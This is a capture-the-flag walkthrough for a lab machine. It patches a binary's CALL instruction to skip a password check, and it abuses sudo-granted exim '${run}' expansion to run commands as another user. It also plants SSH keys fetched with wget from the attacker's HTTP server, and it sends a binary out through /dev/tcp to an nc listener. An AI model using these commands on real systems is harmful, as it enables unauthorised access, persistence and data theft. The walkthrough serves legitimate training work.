│           0x000030b3      e868f0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000030b8      488b15d131..   mov rdx, qword [obj.RBWRTB] ; [0x6290:8]=0x4215 "uri"
│           0x000030bf      488d85f0f7..   lea rax, [var_810h]
│           0x000030c6      4889d6         mov rsi, rdx                ; const char *s2
│           0x000030c9      4889c7         mov rdi, rax                ; char *s1
│           0x000030cc      e84ff0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000030d1      488b15c031..   mov rdx, qword [obj.AEBDV]  ; [0x6298:8]=0x4219 "dad"
│           0x000030d8      488d85f0f7..   lea rax, [var_810h]
│           0x000030df      4889d6         mov rsi, rdx                ; const char *s2
│           0x000030e2      4889c7         mov rdi, rax                ; char *s1
│           0x000030e5      e836f0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000030ea      488b15af31..   mov rdx, qword [obj.QQQQ]   ; [0x62a0:8]=0x421d
│           0x000030f1      488d85f0f7..   lea rax, [var_810h]
│           0x000030f8      4889d6         mov rsi, rdx                ; const char *s2
│           0x000030fb      4889c7         mov rdi, rax                ; char *s1
│           0x000030fe      e81df0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003103      488d95f0fb..   lea rdx, [var_410h]
│           0x0000310a      b800000000     mov eax, 0
│           0x0000310f      b980000000     mov ecx, 0x80
│           0x00003114      4889d7         mov rdi, rdx
│           0x00003117      f348ab         rep stosq qword [rdi], rax
│           0x0000311a      488b154f31..   mov rdx, qword [obj.NRG]    ; [0x6270:8]=0x4206 "cod"
│           0x00003121      488d85f0fb..   lea rax, [var_410h]
│           0x00003128      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000312b      4889c7         mov rdi, rax                ; char *s1
│           0x0000312e      e8edefffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003133      488b153e31..   mov rdx, qword [obj.BRZL]   ; [0x6278:8]=0x420a "igo" ; "\nB"
│           0x0000313a      488d85f0fb..   lea rax, [var_410h]
│           0x00003141      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003144      4889c7         mov rdi, rax                ; char *s1
│           0x00003147      e8d4efffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000314c      488d85f0fb..   lea rax, [var_410h]
│           0x00003153      4889c7         mov rdi, rax                ; const char *s
│           0x00003156      e805efffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x0000315b      4889c2         mov rdx, rax
│           0x0000315e      488d85f0fb..   lea rax, [var_410h]
│           0x00003165      4801d0         add rax, rdx
│           0x00003168      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x0000316d      488b150c31..   mov rdx, qword [obj.LAKDF]  ; [0x6280:8]=0x420e "de"
│           0x00003174      488d85f0fb..   lea rax, [var_410h]
│           0x0000317b      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000317e      4889c7         mov rdi, rax                ; char *s1
│           0x00003181      e89aefffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003186      488d85f0fb..   lea rax, [var_410h]
│           0x0000318d      4889c7         mov rdi, rax                ; const char *s
│           0x00003190      e8cbeeffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00003195      4889c2         mov rdx, rax
│           0x00003198      488d85f0fb..   lea rax, [var_410h]
│           0x0000319f      4801d0         add rax, rdx
│           0x000031a2      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x000031a7      488b15da30..   mov rdx, qword [obj.WVWVEB] ; [0x6288:8]=0x4211 "seg"
│           0x000031ae      488d85f0fb..   lea rax, [var_410h]
│           0x000031b5      4889d6         mov rsi, rdx                ; const char *s2
│           0x000031b8      4889c7         mov rdi, rax                ; char *s1
│           0x000031bb      e860efffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000031c0      488b15c930..   mov rdx, qword [obj.RBWRTB] ; [0x6290:8]=0x4215 "uri"
│           0x000031c7      488d85f0fb..   lea rax, [var_410h]
│           0x000031ce      4889d6         mov rsi, rdx                ; const char *s2
│           0x000031d1      4889c7         mov rdi, rax                ; char *s1
│           0x000031d4      e847efffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000031d9      488b15b830..   mov rdx, qword [obj.AEBDV]  ; [0x6298:8]=0x4219 "dad"
│           0x000031e0      488d85f0fb..   lea rax, [var_410h]
│           0x000031e7      4889d6         mov rsi, rdx                ; const char *s2
│           0x000031ea      4889c7         mov rdi, rax                ; char *s1
│           0x000031ed      e82eefffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000031f2      488d85f0fb..   lea rax, [var_410h]
│           0x000031f9      4889c7         mov rdi, rax                ; const char *s
│           0x000031fc      e85feeffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00003201      4889c2         mov rdx, rax
│           0x00003204      488d85f0fb..   lea rax, [var_410h]
│           0x0000320b      4801d0         add rax, rdx
│           0x0000320e      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00003213      488b153630..   mov rdx, qword [obj.VNZ]    ; [0x6250:8]=0x41f8
│           0x0000321a      488d85f0fb..   lea rax, [var_410h]
│           0x00003221      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003224      4889c7         mov rdi, rax                ; char *s1
│           0x00003227      e8f4eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000322c      488b152530..   mov rdx, qword [obj.HK]     ; [0x6258:8]=0x41fa str.ncor
│           0x00003233      488d85f0fb..   lea rax, [var_410h]
│           0x0000323a      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000323d      4889c7         mov rdi, rax                ; char *s1
│           0x00003240      e8dbeeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003245      488b151430..   mov rdx, qword [obj.EEUU]   ; [0x6260:8]=0x41ff "re"
│           0x0000324c      488d85f0fb..   lea rax, [var_410h]
│           0x00003253      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003256      4889c7         mov rdi, rax                ; char *s1
│           0x00003259      e8c2eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000325e      488b156330..   mov rdx, qword [obj.ASMQXZ] ; [0x62c8:8]=0x4229 ; ")B"
│           0x00003265      488d85f0fb..   lea rax, [var_410h]
│           0x0000326c      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000326f      4889c7         mov rdi, rax                ; char *s1
│           0x00003272      e8a9eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003277      488b153230..   mov rdx, qword [obj.POIKJ]  ; [0x62b0:8]=0x4222 ; "\"B"
│           0x0000327e      488d85f0fb..   lea rax, [var_410h]
│           0x00003285      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003288      4889c7         mov rdi, rax                ; char *s1
│           0x0000328b      e890eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003290      488b151130..   mov rdx, qword [obj.ERTG]   ; [0x62a8:8]=0x4220 ; " B"
│           0x00003297      488d85f0fb..   lea rax, [var_410h]
│           0x0000329e      4889d6         mov rsi, rdx                ; const char *s2
│           0x000032a1      4889c7         mov rdi, rax                ; char *s1
│           0x000032a4      e877eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000032a9      b800000000     mov eax, 0
│           0x000032ae      e848f3ffff     call sym.fn2
│           0x000032b3      488d85f0ef..   lea rax, [format]
│           0x000032ba      4889c7         mov rdi, rax                ; const char *format
│           0x000032bd      b800000000     mov eax, 0
│           0x000032c2      e869edffff     call sym.imp.printf         ; int printf(const char *format)
│           0x000032c7      488d8510ef..   lea rax, [var_10f0h]
│           0x000032ce      4889c6         mov rsi, rax
│           0x000032d1      488d05550f..   lea rax, [0x0000422d]       ; "%s"
│           0x000032d8      4889c7         mov rdi, rax                ; const char *format
│           0x000032db      b800000000     mov eax, 0
│           0x000032e0      e8dbedffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x000032e5      488d8510ef..   lea rax, [var_10f0h]
│           0x000032ec      4889c7         mov rdi, rax                ; char *arg1
│           0x000032ef      e85ff5ffff     call sym.b6v4c8
│           0x000032f4      85c0           test eax, eax
│       ┌─< 0x000032f6      751b           jne 0x3313
│       │   0x000032f8      488d85f0f3..   lea rax, [s]
│       │   0x000032ff      4889c7         mov rdi, rax                ; const char *format
│       │   0x00003302      b800000000     mov eax, 0
│       │   0x00003307      e824edffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x0000330c      b801000000     mov eax, 1
│      ┌──< 0x00003311      eb6f           jmp 0x3382
│      ││   ; CODE XREF from main @ 0x32f6(x)
│      │└─> 0x00003313      488d85f0f7..   lea rax, [var_810h]
│      │    0x0000331a      4889c7         mov rdi, rax                ; const char *format
│      │    0x0000331d      b800000000     mov eax, 0
│      │    0x00003322      e809edffff     call sym.imp.printf         ; int printf(const char *format)
│      │    0x00003327      488d8580ef..   lea rax, [var_1080h]
│      │    0x0000332e      4889c6         mov rsi, rax
│      │    0x00003331      488d05f50e..   lea rax, [0x0000422d]       ; "%s"
│      │    0x00003338      4889c7         mov rdi, rax                ; const char *format
│      │    0x0000333b      b800000000     mov eax, 0
│      │    0x00003340      e87bedffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│      │    0x00003345      488d8580ef..   lea rax, [var_1080h]
│      │    0x0000334c      4889c7         mov rdi, rax                ; char *arg1
│      │    0x0000334f      e88af5ffff     call sym.x1w5z9
│      │    0x00003354      85c0           test eax, eax
│      │┌─< 0x00003356      751b           jne 0x3373
│      ││   0x00003358      488d85f0fb..   lea rax, [var_410h]
│      ││   0x0000335f      4889c7         mov rdi, rax                ; const char *format
│      ││   0x00003362      b800000000     mov eax, 0
│      ││   0x00003367      e8c4ecffff     call sym.imp.printf         ; int printf(const char *format)
│      ││   0x0000336c      b801000000     mov eax, 1
│     ┌───< 0x00003371      eb0f           jmp 0x3382
│     │││   ; CODE XREF from main @ 0x3356(x)
│     ││└─> 0x00003373      b800000000     mov eax, 0
│     ││    0x00003378      e8ecf5ffff     call sym.k8j4h3
│     ││    0x0000337d      b800000000     mov eax, 0
│     ││    ; CODE XREFS from main @ 0x3311(x), 0x3371(x)
│     └└──> 0x00003382      488b55f8       mov rdx, qword [canary]
│           0x00003386      64482b1425..   sub rdx, qword fs:[0x28]
│       ┌─< 0x0000338f      7405           je 0x3396
│       │   0x00003391      e81aedffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       │   ; CODE XREF from main @ 0x338f(x)
│       └─> 0x00003396      c9             leave
└           0x00003397      c3             ret
[0x00002ccf]>
```

We navigate through the compiled code until we locate the CALL instruction that calls the first printf function and its next instruction.

```bash
│           0x000032c2      e869edffff     call sym.imp.printf         ; int printf(const char *format)
│           0x000032c7      488d8510ef..   lea rax, [var_10f0h]
```

Then we will look for the address of the k8j4h3() function, which is the one called once the verification system is passed.

```bash
is~k8j4h3
```
```bash
59  0x00002969 0x00002969 GLOBAL FUNC   870      k8j4h3
```

With this information we now need to calculate the relative offset from the k8j4h3() function to the memory address 0x000032c7

```
offset = address of the destination function - address of the instruction following the CALL

offset = 0x00002969 - 0x000032c7 = -0x95E
```

Now we must encode the offset in the CALL instruction in 2's complement

```
We take the absolute offset 0x95E and convert it to binary

0x95E= 1001 0101 1110

we invert the bits and add +1

1001 0101 1110= 0110 1010 0001 + 1 = 0110 1010 0010

we convert the result into hexadecimal

0110 1010 0010 = 0x6a2

But since we need 4 bytes, we complement on the left with "f"

0x6a2 = 0xfffff6a2

we convert to little endian format

ff ff f6 a2 = a2 f6 ff ff

we add the CALL instruction

final_result= e8a2f6ffff

```

We now have the relative offset to replace the call to the printf function with the k8j4h3() function. 

```bash
s 0x000032c2
wx e8a2f6ffff
pd 1 @ 0x000032c2
```
```bash
│           0x000032c2      e8a2f6ffff     call sym.k8j4h3
```

The call to the function we want has been successfully overwritten. We exit and run the program again

```
quit
./sec2pass
```

![image](https://github.com/user-attachments/assets/c134722b-fd6b-4d99-acbb-78a1462c5ea8)

We have skipped the verification and after testing the credentials, the only ones that turn out to be valid are Carlos's through the SSH service.

# Lateral Movement (optional)

## carlos

In the user Carlos's directory we find the flag and the mbox file

![image](https://github.com/user-attachments/assets/291884b7-c603-4466-8dfe-ddda3fcf42f3)

I check the mbox file

```bash
cat mbox
```
```bash
From pedro@cybersec Thu Mar 20 15:35:07 2025
Return-path: <pedro@cybersec>
Envelope-to: carlos@cybersec
Delivery-date: Thu, 20 Mar 2025 15:35:07 +0000
Received: from pedro by cybersec with local (Exim 4.96)
	(envelope-from <pedro@cybersec>)
	id 1tvHvH-00002O-1M
	for carlos@cybersec;
	Thu, 20 Mar 2025 15:35:07 +0000
To: carlos@cybersec
Subject: Viaje
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tvHvH-00002O-1M@cybersec>
From: pedro@cybersec
Date: Thu, 20 Mar 2025 15:35:07 +0000
Status: RO

Hola Carlos, espero te encuentres bien, te comento que tengo que ir de viaje con el coordinador a un evento en otra ciudad, el problema es que estoy en espera de un reporte forense que enviaran desde Dracor S.A. y en vista de que no estare hablare con el administrador para que te asigne permisos para que asi puedas chequear mi buzon, responder el correo de Dracor S.A. y asi adelantas trabajo mientras llego


From carlos@cybersec Thu Mar 20 15:37:51 2025
Return-path: <carlos@cybersec>
Envelope-to: pedro@cybersec
Delivery-date: Thu, 20 Mar 2025 15:37:51 +0000
Received: from carlos by cybersec with local (Exim 4.96)
        (envelope-from <carlos@cybersec>)
        id 1tvHxv-00002X-0U
        for pedro@cybersec;
        Thu, 20 Mar 2025 15:37:51 +0000
To: pedro@cybersec
Subject: Viaje
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tvHxv-00002X-0U@cybersec>
From: carlos@cybersec
Date: Thu, 20 Mar 2025 15:37:51 +0000
Status: RO

Hola Pedro, perfecto, recuerdo el reporte, ya me habias comentado de el antes y listo yo quedo atento a tu buzon, me notificas culquier novedad.

From pedro@cybersec Thu Mar 20 15:42:23 2025
Return-path: <pedro@cybersec>
Envelope-to: carlos@cybersec
Delivery-date: Thu, 20 Mar 2025 15:42:23 +0000
Received: from pedro by cybersec with local (Exim 4.96)
	(envelope-from <pedro@cybersec>)
	id 1tvI2J-00002o-0k
	for carlos@cybersec;
	Thu, 20 Mar 2025 15:42:23 +0000
To: carlos@cybersec
Subject: Viaje
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tvI2J-00002o-0k@cybersec>
From: pedro@cybersec
Date: Thu, 20 Mar 2025 15:42:23 +0000
Status: RO

Saludos Carlos, ya he notificado al administrador (root) y queda a la espera de que le hagas llegar el requerimiento en root@cybersec, recuerda el formato de solicitud:

Nombre solicitante:
Matricula solicitante:
Fecha:
Breve descripcion:

en la descripcion es importante que coloques el siguiente numero de caso para dar continuidad con mi solicitud, caso nro: 000-01458
y esta al pendiente de tu bandeja porque una vez te habiliten los permisos recibiras la notificacion, saludos
```

It seems that the administrator expects to receive an email to assign this user certain permissions to perform actions as the user Pedro. The mail agent used is EXIM. ​​We obtain this information if we detail the emails in Mbox.

The administrator is waiting for specific information:
Applicant's name:
Applicant's license plate:
Date:
Brief description:

What I don't have is Carlos's license plate.

Performing an advanced search on the system, I managed to find Carlos's license plate.

```bash
find / -user carlos 2>/dev/null |grep -vE 'proc|dev' |xargs grep "matricula" 2>/dev/null
```
```bash
/home/carlos/.bashrc:alias matricula='echo "mi matricula es: 1250319"'
```

Now that I have Carlos's license plate, I'll try emailing the administrator to see if he responds.

```bash
echo -e "Nombre solicitante: carlos\nMatricula solicitante:1250319\nFecha:22-03-25\nBreve descripcion: caso nro: 000-01458" | /usr/sbin/exim root@cybersec
```

I'm checking to see if I get answers from the administrator.

![image](https://github.com/user-attachments/assets/bc04dbe1-07b8-4cf1-9690-d3f1123bc3ce)

The administrator has responded and has granted certain privileges, so we check the permissions with sudo -l

![image](https://github.com/user-attachments/assets/3f9cc25f-ad49-4083-b98c-5437c4786ede)

The administrator assigned Carlos the necessary permissions to manage Exim as Pedro. To abuse this binary and jump to the user pedro, it is necessary to read its documentation where we can find the way to execute commands.

![image](https://github.com/user-attachments/assets/584794b8-bebe-4d1e-902a-7be409f45594)

After a while, the permissions that had been granted to Carlos were revoked, so to test the execution of commands with the information found in Exim, it is necessary to send the email to the administrator again. Once the permissions are granted again, we try to execute the command: `sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "id"}}'`

![image](https://github.com/user-attachments/assets/7aea5e4a-110f-432d-af43-469af31355a4)

The command execution worked, the problem is that it is not possible to launch a bash directly, so my idea will be to load a pair of keys created by me in /home/pedro/.ssh and thus obtain access via SSH.


We create a pair of SSH keys on our attacking machine:
```bash
ssh-keygen -t rsa -b 4096
```
```bash
Generating public/private rsa key pair.
Enter file in which to save the key (/home/darks/.ssh/id_rsa): 
/home/darks/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase for "/home/darks/.ssh/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/darks/.ssh/id_rsa
Your public key has been saved in /home/darks/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:zyOXK9iVVZPcMOGF3QQYw8G2CQsIizG3vexCh3e88pM darks@Darks
The key's randomart image is:
+---[RSA 4096]----+
|  o o. .   o+==X+|
|   = +. . . =o*o+|
|  . o .  . + +.. |
|     o o  . +    |
|    o = S  o     |
|   . + . +o.     |
|    . oooo*      |
|     ..oEo o     |
|        .o.      |
+----[SHA256]-----+
```

We copy the keys to our current directory and create a copy of id_rsa.pub with the name authorized_keys

```bash
cp ~/.ssh/id_rsa . && cp ~/.ssh/id_rsa.pub . && cp id_rsa.pub authorized_keys
```

Now we must download the authorized_keys and id_rsa.pub files to /home/pedro/.ssh and for this we start a python server on our attacking machine

```bash
python3 -m http.server 80
```

Then we send the email to the administrator again so that he assigns us the permissions to run exim as Pedro and once with the permissions we download the keys

```bash
echo -e "Nombre solicitante: carlos\nMatricula solicitante:1250319\nFecha:22-03-25\nBreve descripcion: caso nro: 000-01458" | /usr/sbin/exim root@cybersec
```

```bash
sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "cd /home/pedro/.ssh && wget http://172.17.0.1/authorized_keys"}}'
```
```bash
sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "cd /home/pedro/.ssh && wget http://172.17.0.1/id_rsa.pub"}}'
```
```bash
sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "ls -la /home/pedro/.ssh"}}'
```

![image](https://github.com/user-attachments/assets/509ec626-c114-4eb0-b9e3-6e3bdebcbba9)

we access via ssh as `pedro`

```bash
ssh -i id_rsa.pub pedro@172.17.0.2
```

![image](https://github.com/user-attachments/assets/e58b75fc-ab60-4b7b-b6d8-f8a7202a59be)


# Privilege Escalation

## pedro

In Pedro's directory we also see the mbox file, so we first read the mail conversations of this user

```bash
cat mbox
```
```bash
From admin2@cybersec Wed Mar 19 23:02:17 2025
Return-path: <admin2@cybersec>
Envelope-to: pedro@cybersec
Delivery-date: Wed, 19 Mar 2025 23:02:17 +0000
Received: from admin2 by cybersec with local (Exim 4.96)
	(envelope-from <admin2@cybersec>)
	id E1tv2QT-00004Y-04
	for pedro@cybersec;
	Wed, 19 Mar 2025 23:02:17 +0000
To: pedro@cybersec
Subject: debugging & reverse engineering
MIME-Version: 1.0
Content-Type: text/plain; charset="ANSI_X3.4-1968"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tv2QT-00004Y-04@cybersec>
From: admin2 <admin2@cybersec>
Date: Wed, 19 Mar 2025 23:02:17 +0000
Status: RO

Pedro, hemos detectado una posible puerta trasera en el binario que he dejado en tu directorio 
(Este binario fue desarrollado por el antiguo equipo de desarrollo en Dracor S.A. para llevar un registro de entrada/salida de los trabajadores), necesitamos 
que lo analisis y realices un reporte lo mas pronto posible. Quedo atento a tus comentarios, saludos.


From pedro@cybersec Wed Mar 20 00:45:47 2025
Return-path: <pedro@cybersec>
Envelope-to: admin2@cybersec
Delivery-date: Wed, 20 Mar 2025 00:45:47 +0000
Received: from pedro by cybersec with local (Exim 4.96)
	(envelope-from <pedro@cybersec>)
	id 1tv2bb-00005C-0v
	for root@cybersec;
	Wed, 20 Mar 2025 00:45:47 +0000
To: admin2@cybersec
Subject: debugging & reverse engineering
MIME-Version: 1.0
Content-Type: text/plain; charset="ANSI_X3.4-1968"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tv2bb-00005C-0v@cybersec>
From: pedro@cybersec
Date: Wed, 20 Mar 2025 00:45:47 +0000
Status: RO

Buenas tardes, le adelanto los datos mas relevantes del analisis hasta la fecha.
El binario en efecto cuenta con una puerta trasera la cual es activada a traves de una funcion que nunca se llama en la ejecucion normal del programa, tambien se detecto
un buffer over flow el cual debe ser el detonante para acceder a la puerta trasera, sin embargo hasta la fecha me encuentro un poco limitado sin posibilidades de poder
continuar con un analisis mas profundo debido a que no es posible depurar el binario (sin privilegios) y tampoco es posible la ejecucion del mismo en una MV. El binario
realiza una comprobacion de su entorno de ejecucion, si detecta una MV no se ejecuta, lo mismo sucede si intento depurarlo, detecta que se intenta depurar y no se ejecuta
Si fuera posible, necesito poder depurar el binario ejecutando el depurador con privilegios y forzar la depuracion. Quedo a la espera de comentarios, saludos


From admin2@cybersec Wed Mar 20 10:02:17 2025
Return-path: <admin2t@cybersec>
Envelope-to: pedro@cybersec
Delivery-date: Wed, 20 Mar 2025 10:02:17 +0000
Received: from admin2 by cybersec with local (Exim 4.96)
        (envelope-from <admin2@cybersec>)
        id E1tv2QT-12404Y-04
        for pedro@cybersec;
        Wed, 20 Mar 2025 10:02:17 +0000
To: pedro@cybersec
Subject: debugging & reverse engineering
MIME-Version: 1.0
Content-Type: text/plain; charset="ANSI_X3.4-1968"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tv2QT-12404Y-04@cybersec>
From: admin2 <admin2@cybersec>
Date: Wed, 20 Mar 2025 10:02:17 +0000
Status: RO

Hola Pedro, estuve leyendo tu correo y tengo otra pregunta para ti, crees sea posible puedas desarrollar una POC para el binario?
ya que esto seria una prueba contundente contra el antiguo equipo de desarrollo de Dracor S.A.
En cuanto a darte privilegios para que puedas depurar el binario ya que no es posible ejecutarlo en MV ni depurarlo sin provilegios,
voy a estar notificando al administrador (root) para que configure el entorno para que esto lo llevemos de la manera mas segura posible, 
espera nuevas actualizaciones de mi parte, pronto te estare escribiendo...


From admin2@cybersec Wed Mar 20 14:02:17 2025
Return-path: <admin2@cybersec>
Envelope-to: pedro@cybersec
Delivery-date: Wed, 20 Mar 2025 14:02:17 +0000
Received: from admin2 by cybersec with local (Exim 4.96)
        (envelope-from <admin2@cybersec>)
        id E1tv2QT-12404z-04
        for pedro@cybersec;
        Wed, 20 Mar 2025 14:02:17 +0000
To: pedro@cybersec
Subject: debugging & reverse engineering
MIME-Version: 1.0
Content-Type: text/plain; charset="ANSI_X3.4-1968"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tv2QT-12404z-04@cybersec>
From: admin2 <admin2@cybersec>
Date: Wed, 20 Mar 2025 14:02:17 +0000
Status: RO

Saludos Pedro, como te comente, iba a notificar al administrador para configurar el entorno y asi poder darte los privilegios que solicitaste y ya se encuentra todo
listo, cuando requieras los privilegios sobre gdb se lo haces saber al administrador en root@cybersec, como es de costumbre, antes de habilitar esto debes enviar el
formato de solicitud de costumbre:

Nombre solicitante:
Matricula solicitante:
Fecha:
Breve descripcion:

Una vez reciba tu correo activara los permisos necesarios, saludos




From pedro@cybersec Thu Mar 20 15:35:07 2025
Return-path: <pedro@cybersec>
Envelope-to: carlos@cybersec
Delivery-date: Thu, 20 Mar 2025 15:35:07 +0000
Received: from pedro by cybersec with local (Exim 4.96)
	(envelope-from <pedro@cybersec>)
	id 1tvHvH-00002O-1M
	for carlos@cybersec;
	Thu, 20 Mar 2025 15:35:07 +0000
To: carlos@cybersec
Subject: Viaje
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tvHvH-00002O-1M@cybersec>
From: pedro@cybersec
Date: Thu, 20 Mar 2025 15:35:07 +0000
Status: RO

Hola Carlos, espero te encuentres bien, te comento que tengo que ir de viaje con el coordinador a un evento en otra ciudad, el problema es que estoy en espera de un reporte forense que enviaran desde Dracor S.A. y en vista de que no estare hablare con el administrador para que te asigne permisos para que asi puedas chequear mi buzon, responder el correo de Dracor S.A. y asi adelantas trabajo mientras llego


From carlos@cybersec Thu Mar 20 15:37:51 2025
Return-path: <carlos@cybersec>
Envelope-to: pedro@cybersec
Delivery-date: Thu, 20 Mar 2025 15:37:51 +0000
Received: from carlos by cybersec with local (Exim 4.96)
	(envelope-from <carlos@cybersec>)
	id 1tvHxv-00002X-0U
	for pedro@cybersec;
	Thu, 20 Mar 2025 15:37:51 +0000
To: pedro@cybersec
Subject: Viaje
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tvHxv-00002X-0U@cybersec>
From: carlos@cybersec
Date: Thu, 20 Mar 2025 15:37:51 +0000
Status: RO

Hola Pedro, perfecto, recuerdo el reporte, ya me habias comentado de el antes y listo yo quedo atento a tu buzon, me notificas culquier novedad.

From pedro@cybersec Thu Mar 20 15:42:23 2025
Return-path: <pedro@cybersec>
Envelope-to: carlos@cybersec
Delivery-date: Thu, 20 Mar 2025 15:42:23 +0000
Received: from pedro by cybersec with local (Exim 4.96)
        (envelope-from <pedro@cybersec>)
        id 1tvI2J-00002o-0k
        for carlos@cybersec;
        Thu, 20 Mar 2025 15:42:23 +0000
To: carlos@cybersec
Subject: Viaje
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tvI2J-00002o-0k@cybersec>
From: pedro@cybersec
Date: Thu, 20 Mar 2025 15:42:23 +0000
Status: RO

Saludos Carlos, ya he notificado al administrador (root) y queda a la espera de que le hagas llegar el requerimiento, recuerda el formato de solicitud:

Nombre solicitante:
Matricula solicitante:
Fecha:
Breve descripcion:

en la descripcion es importante que coloques el siguiente numero de caso para dar continuidad con mi solicitud, caso nro: 000-01458
y esta al pendiente de tu bandeja porque una vez te habiliten los permisos recibiras la notificacion, saludos
```

There are two conversations here, the first is with the administrator talking about the Hallx program that is in Pedro's directory and the second is with Carlos, this time I will focus on the first conversation.

In the conversation between the administrator and Pedro, the latter asks the admin for privileges to be able to execute gdb and thus be able to debug the hallx binary. It seems that the binary cannot be debugged without privileges and it is also not possible to execute it in a virtual machine since it checks its environment. 

If we check the analisis_hallx directory we will see the following screenshots of the analysis that has been done to the program

![image](https://github.com/user-attachments/assets/9394bd95-7708-48ca-9df2-33547f333dcc)

![image](https://github.com/user-attachments/assets/818d2332-c5b8-4836-8a20-4c20158b11b5)

![image](https://github.com/user-attachments/assets/4d131003-016d-466d-95ba-f752f424c25f)

![image](https://github.com/user-attachments/assets/86c4aba1-79f2-45d0-8eb9-b7e4c46f9277)

![image](https://github.com/user-attachments/assets/e13a1d02-5433-471e-a959-a0b125ed034e)

These appear to be proof of what I read in the email. The screenshots demonstrate the Bof vulnerability, debug detection, and execution detection on virtual machines. For now, I'm going to ask the administrator for the privileges, since as you can read in the email, they will assign Pedro controlled permissions. 

Since, just like with Carlos, I need Pedro's license plate, I will perform the same search in the system as I did with Carlos.

```bash
find / -user pedro 2>/dev/null |grep -vE 'proc|dev' |xargs grep "matricula" 2>/dev/null
```
```bash
/home/pedro/.mnts.txt:matricula: 1250314
```

Once Pedro's license plate has been located, I send the email to the administrator as shown in the conversation between the two.

```bash
echo -e "Nombre solicitante: pedro\nMatricula solicitante: 1250314\nFecha:22-03-25\nBreve descripcion: gdb" | /usr/sbin/exim root@cybersec
```

![image](https://github.com/user-attachments/assets/e3f55ff9-6b18-46e9-a9ba-a002883821d9)

![image](https://github.com/user-attachments/assets/943c61a5-7361-4353-9b92-5689bead6171)

![image](https://github.com/user-attachments/assets/8c7aa7e8-7850-4651-8583-9eebc54aec7b)

Pedro has been given privileges to execute the script /usr/local/bin/secure_gdb. 
If we analyze the script, it seems that it checks that it is only possible to execute the specific binary and the script even checks the sha256 hash of the binary to know if it was altered or impersonated, that is, it would not be possible to replace the binary because the execution would fail.

But if it is possible to run the debugger as root, then within the debugger I could execute system commands, so I will run the script as it expects to be executed and from within execute commands as root.

```bash
sudo /usr/local/bin/secure_gdb /home/pedro/hallx
```

![image](https://github.com/user-attachments/assets/e5fa3760-23b3-40dc-8189-3dae0582fd75)

They limited the execution of commands internally in gdb, so this will not be an option to escalate to root.

https://github.com/user-attachments/assets/f896b0a8-66d8-46eb-982a-a42e0aba4b34

In fact, the binary is vulnerable to a BOF attack and, according to the message, it seems that the canary protection is active, I will pass it to my machine to analyze it.

From my machine I run:

```bash
nc -lnvp 9000 > hallx
```

then I send the program

```bash
cat hallx > /dev/tcp/172.17.0.1/9000
```

![image](https://github.com/user-attachments/assets/1bacb28e-807f-4b16-97bf-0d95110b159e)

Now I begin to analyze it to see how I can exploit it.

![image](https://github.com/user-attachments/assets/a425eba2-170c-434e-8d22-fc4ca28ac0b2)

![image](https://github.com/user-attachments/assets/19ce5347-9005-4f54-9778-63a47c6f5ab4)


So, in main() you can see the functions to detect debugging and also virtualization, you can also see the factor1 function that invokes the shell

Now I check the protections present in the program

```bash
checksec --file=hallx
```

